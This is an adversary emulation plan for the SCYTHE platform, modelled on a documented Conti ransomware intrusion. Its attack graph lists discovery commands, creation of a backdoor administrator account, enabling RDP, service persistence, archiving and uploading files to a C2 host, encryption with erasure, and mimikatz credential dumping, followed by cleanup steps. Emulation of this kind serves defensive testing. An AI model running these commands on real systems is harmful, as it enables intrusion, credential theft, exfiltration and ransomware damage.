# Conti Ransomware Adversary Emulation Plan

This threat is based on The DFIR Report post on May 12, 2021: https://thedfirreport.com/2021/05/12/conti-ransomware/

To emulate:
1. Download and import the threat in JSON format to your SCYTHE instance - https://raw.githubusercontent.com/scythe-io/community-threats/master/Conti/Conti_scythe_threat.json
2. Download the Virtual File System (VFS) files under Conti/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/threats/Conti
4. Create a new campaign, selecting HTTPS, and ensuring the communication options match the CTI: --cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 62 --jitter 39
5. Set the Program database path to: A:\source\conti_v3\x64\Release\cryptor_dll.pdb 
6. Import from Existing Threat: Conti
7. Launch Campaign
8. Execute with rundll32.exe

Note that different TTPs will be performed based on the endpoint being on a domain or not and running with local administrator privileges or not.

 #Attack Graph
```mermaid
graph TD
Step0["<b> module: https </b> <br>"]
Step1[""]
Step2["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load run </i> <br>"]
Step3["<b> module: run </b> <br><h4> parameters: </h4> <i> ipconfig /all </i> <br><a href='https://attack.mitre.org/techniques/T1016'>att&ck-technique:T1016</a><br>
"]
Step4["<b> module: run </b> <br><h4> parameters: </h4> <i> systeminfo </i> <br><a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step5["<b> module: run </b> <br><h4> parameters: </h4> <i> whoami /groups </i> <br><a href='https://attack.mitre.org/techniques/T1069.001'>att&ck-technique:T1069.001</a><br>
"]
Step6["<b> module: run </b> <br><h4> parameters: </h4> <i> net config workstation </i> <br><a href='https://attack.mitre.org/techniques/T1049'>att&ck-technique:T1049</a><br>
"]
Step7["<b> module: run </b> <br><h4> parameters: </h4> <i> net use </i> <br><a href='https://attack.mitre.org/techniques/T1021.002'>att&ck-technique:T1021.002</a><br>
"]
Step8["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c echo %userdomain% </i> <br><a href='https://attack.mitre.org/techniques/T1078.002'>att&ck-technique:T1078.002</a><br>
"]
Step9[""]
Step10["<b> module: run </b> <br><h4> parameters: </h4> <i> nltest /domain_trusts </i> <br><a href='https://attack.mitre.org/techniques/T1482'>att&ck-technique:T1482</a><br>
"]
Step11["<b> module: run </b> <br><h4> parameters: </h4> <i> nltest /domain_trusts /all_trusts </i> <br><a href='https://attack.mitre.org/techniques/T1482'>att&ck-technique:T1482</a><br>
"]
Step12["<b> module: run </b> <br><h4> parameters: </h4> <i> net view /all /domain </i> <br><a href='https://attack.mitre.org/techniques/T1087.002'>att&ck-technique:T1087.002</a><br>
"]
Step13["<b> module: run </b> <br><h4> parameters: </h4> <i> net view /all </i> <br><a href='https://attack.mitre.org/techniques/T1069.001'>att&ck-technique:T1069.001</a><br>
"]
Step14["<b> module: run </b> <br><h4> parameters: </h4> <i> net group Domain Admins /domain </i> <br><a href='https://attack.mitre.org/techniques/T1087.002'>att&ck-technique:T1087.002</a><br>
"]
Step15[""]
Step16["<b> module: controller </b> <br><h4> parameters: </h4> <i> --integrity </i> <br>"]
Step17[""]
Step18["<b> module: run </b> <br><h4> parameters: </h4> <i> net user /add /Y nuuser 7HeC00l3stP@ssw0rd </i> <br><a href='https://attack.mitre.org/techniques/T1136'>att&ck-technique:T1136</a><br>
"]
Step19["<b> module: run </b> <br><h4> parameters: </h4> <i> net localgroup administrators nuuser /add </i> <br><a href='https://attack.mitre.org/techniques/T1136.001'>att&ck-technique:T1136.001</a><br>
"]
Step20["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd.exe /C reg add hklm\system\currentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0x0 /f </i> <br><a href='https://attack.mitre.org/techniques/T1021.001'>att&ck-technique:T1021.001</a><br>
"]
Step21["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c sc.exe create Conti binpath= c:\windows\system32\Conti.exe type= share start= auto </i> <br><a href='https://attack.mitre.org/techniques/T1543.003'>att&ck-technique:T1543.003</a><br>
"]
Step22[""]
Step23["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load crypt </i> <br>"]
Step24["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load downloader </i> <br>"]
Step25["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load file </i> <br>"]
Step26["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load uploader </i> <br>"]
Step27["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell mkdir %USERPROFILE%\Desktop\Conti </i> <br><a href='https://attack.mitre.org/techniques/T1059.001'>att&ck-technique:T1059.001</a><br>
"]
Step28["<b> module: file </b> <br><h4> parameters: </h4> <i> --create --path %USERPROFILE%\Desktop\Conti\target_file.doc --size 1MB --count 100 --random </i> <br><a href='https://attack.mitre.org/techniques/T1074.001'>att&ck-technique:T1074.001</a><br>
"]
Step29["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell Compress-Archive -Path $env:userprofile\Desktop\Conti -CompressionLevel Optimal -Destination $env:userprofile\Desktop\exfil.zip </i> <br><a href='https://attack.mitre.org/techniques/T1560.002'>att&ck-technique:T1560.002</a><br>
"]
Step30["<b> module: uploader </b> <br><h4> parameters: </h4> <i> --remotepath %USERPROFILE%\Desktop\exfil.zip </i> <br><a href='https://attack.mitre.org/techniques/T1041'>att&ck-technique:T1041</a><br>
"]
Step31["<b> module: crypt </b> <br><h4> parameters: </h4> <i> --target %USERPROFILE%\Desktop\Conti\ --encrypt --password dTonVhthjUJCMM6JkCi8 --erase </i> <br><a href='https://attack.mitre.org/techniques/T1486'>att&ck-technique:T1486</a><br>
"]
Step32["<b> module: downloader </b> <br><h4> parameters: </h4> <i> --src VFS:/shared/threats/Conti/readme.txt --dest %USERPROFILE%\Desktop\readme.txt </i> <br><a href='https://attack.mitre.org/techniques/T1491.001'>att&ck-technique:T1491.001</a><br>
"]
Step33["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell notepad %USERPROFILE%\Desktop\readme.txt </i> <br><a href='https://attack.mitre.org/techniques/T1059.001'>att&ck-technique:T1059.001</a><br>
"]
Step34[""]
Step35["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c rmdir /Q /S %USERPROFILE%\Desktop\Conti </i> <br>"]
Step36["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c del %USERPROFILE%\Desktop\exfil.zip </i> <br>"]
Step37["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c del %USERPROFILE%\Desktop\README.txt </i> <br>"]
Step38["<b> module: controller </b> <br><h4> parameters: </h4> <i> --integrity </i> <br>"]
Step39[""]
Step40["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd.exe /C reg add hklm\system\currentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0x1 /f </i> <br><a href='https://attack.mitre.org/techniques/T1112'>att&ck-technique:T1112</a><br>
"]
Step41["<b> module: run </b> <br><h4> parameters: </h4> <i> net localgroup administrators nuuser /del </i> <br>"]
Step42["<b> module: run </b> <br><h4> parameters: </h4> <i> net user /del nuuser </i> <br><a href='https://attack.mitre.org/techniques/T1531'>att&ck-technique:T1531</a><br>
"]
Step43["<b> module: run </b> <br><h4> parameters: </h4> <i> sc delete Conti </i> <br><a href='https://attack.mitre.org/techniques/T1489'>att&ck-technique:T1489</a><br>
"]
Step44["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load mimikatz </i> <br>"]
Step45["<b> module: mimikatz </b> <br><h4> parameters: </h4> <i> --arglist sekurlsa::logonPasswords </i> <br><a href='https://attack.mitre.org/techniques/T1003.001'>att&ck-technique:T1003.001</a><br>
"]
Step46["<b> module: controller </b> <br><h4> parameters: </h4> <i> --shutdown </i> <br><a href='https://attack.mitre.org/tactics/TA0011'>att&ck-tactic:TA0011</a><br>
<a href='https://attack.mitre.org/techniques/T1219'>att&ck-technique:T1219</a><br>
"]
Step0 --> Step1
Step1 --> Step2
Step2 --> Step3
Step3 --> Step4
Step4 --> Step5
Step5 --> Step6
Step6 --> Step7
Step7 --> Step8
Step8 --> Step9
Step9 --> Step10
Step10 --> Step11
Step11 --> Step12
Step12 --> Step13
Step13 --> Step14
Step14 --> Step15
Step15 --> Step16
Step16 --> Step17
Step17 --> Step18
Step18 --> Step19
Step19 --> Step20
Step20 --> Step21
Step21 --> Step22
Step22 --> Step23
Step23 --> Step24
Step24 --> Step25
Step25 --> Step26
Step26 --> Step27
Step27 --> Step28
Step28 --> Step29
Step29 --> Step30
Step30 --> Step31
Step31 --> Step32
Step32 --> Step33
Step33 --> Step34
Step34 --> Step35
Step35 --> Step36
Step36 --> Step37
Step37 --> Step38
Step38 --> Step39
Step39 --> Step40
Step40 --> Step41
Step41 --> Step42
Step42 --> Step43
Step43 --> Step44
Step44 --> Step45
Step45 --> Step46
Step46 --> Step47
```
